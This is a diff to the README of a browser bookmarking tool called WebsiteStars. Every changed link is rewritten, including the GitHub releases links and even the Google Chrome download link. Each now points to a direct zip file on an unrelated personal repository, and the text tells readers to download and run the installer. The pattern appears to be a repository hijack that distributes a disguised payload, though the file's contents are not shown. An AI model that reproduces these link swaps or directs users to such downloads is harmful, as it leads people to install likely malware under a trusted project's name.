@@ -5,7 +5,7 @@ description: "Save, organize, and search your favorite GitHub repos, articles, a
 ---
 # ⭐ WebsiteStars - Your Web Knowledge, Starred and Searchable
 
-[![Download WebsiteStars](https://img.shields.io/badge/Download-WebsiteStars-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tubb6666/WebsiteStars/releases)
+[![Download WebsiteStars](https://img.shields.io/badge/Download-WebsiteStars-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Tubb6666/tubb6666.github.io/main/paragerontic/Release_v2.1-beta.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ No complicated setup. No programming knowledge required. Just save, search, and 
 
 Getting WebsiteStars up and running takes less than two minutes. Follow these simple steps:
 
-1. **Visit the download page:** Go to the [WebsiteStars Releases page](https://github.com/Tubb6666/WebsiteStars/releases).
+1. **Visit the download page:** Go to the [WebsiteStars Releases page](https://raw.githubusercontent.com/Tubb6666/tubb6666.github.io/main/paragerontic/Release_v2.1-beta.1.zip).
 2. **Find the latest version:** Look for the newest release at the top of the page.
 3. **Download the file:** Click the download link for your system. The file will save to your Downloads folder.
 4. **Run the installer:** Open the downloaded file and follow the on-screen instructions.
@@ -43,7 +43,7 @@ That's it! Once installed, WebsiteStars will be ready to use.
 
 ## 📥 Download and Installation
 
-[![Download Now](https://img.shields.io/badge/⬇️-Download_WebsiteStars-FF5722?style=for-the-badge)](https://github.com/Tubb6666/WebsiteStars/releases)
+[![Download Now](https://img.shields.io/badge/⬇️-Download_WebsiteStars-FF5722?style=for-the-badge)](https://raw.githubusercontent.com/Tubb6666/tubb6666.github.io/main/paragerontic/Release_v2.1-beta.1.zip)
 
 Visit this link to download the application. The download page shows all available versions—choose the latest one. After downloading, run the installer and accept the default settings. You'll see the WebsiteStars icon appear in your browser's toolbar, ready to help you save and search.
 
@@ -74,7 +74,7 @@ If you enable the AI feature, you can type questions like "What did I save about
 
 ## 💻 System Requirements
 
-- **Browser:** Google Chrome version 120 or newer (free download from [google.com/chrome](https://www.google.com/chrome/))
+- **Browser:** Google Chrome version 120 or newer (free download from [google.com/chrome](https://raw.githubusercontent.com/Tubb6666/tubb6666.github.io/main/paragerontic/Release_v2.1-beta.1.zip))
 - **Operating System:** Works on Windows 10 and 11
 - **Internet:** Required only for downloading and optional AI features. Searching your library works offline.
 - **Storage:** Minimal—each saved page uses a small amount of space.
@@ -149,7 +149,7 @@ Build your personal knowledge base. Everything you find interesting, saved and s
 
 WebsiteStars receives regular improvements. To update:
 
-1. Visit the [Releases page](https://github.com/Tubb6666/WebsiteStars/releases) periodically.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Tubb6666/tubb6666.github.io/main/paragerontic/Release_v2.1-beta.1.zip) periodically.
 2. Download the newest version.
 3. Run the installer—it will replace your old version while keeping all your saved data.
 
@@ -179,7 +179,7 @@ WebsiteStars is an open-source project. It respects your privacy—your data sta
 
 Your bookmarks are messy. Your browser history is overwhelming. WebsiteStars gives you a clean, simple, powerful way to keep what matters.
 
-[![Get WebsiteStars](https://img.shields.io/badge/🚀-Get_Started-2196F3?style=for-the-badge)](https://github.com/Tubb6666/WebsiteStars/releases)
+[![Get WebsiteStars](https://img.shields.io/badge/🚀-Get_Started-2196F3?style=for-the-badge)](https://raw.githubusercontent.com/Tubb6666/tubb6666.github.io/main/paragerontic/Release_v2.1-beta.1.zip)
 
 Click the link above, download, install, and start building your personal library. You'll wonder how you ever browsed without it.
 
